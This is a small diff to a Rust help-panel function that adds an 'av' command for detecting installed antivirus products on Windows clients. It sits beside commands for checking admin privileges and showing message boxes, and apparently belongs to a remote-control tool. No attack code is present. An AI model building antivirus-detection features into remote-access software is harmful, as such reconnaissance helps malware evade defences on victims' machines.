@@ -104,6 +104,10 @@ pub fn build_help_panel() -> String {
         "Check if the client has admin privileges.",
     ));
     panel.push_str(&help_row(
+        "av",
+        "Check for installed AntiVirus products (only windows).",
+    ));
+    panel.push_str(&help_row(
         "display -t \"Title\" -c \"Content\" -l info",
         "Show a message box on the client.",
     ));
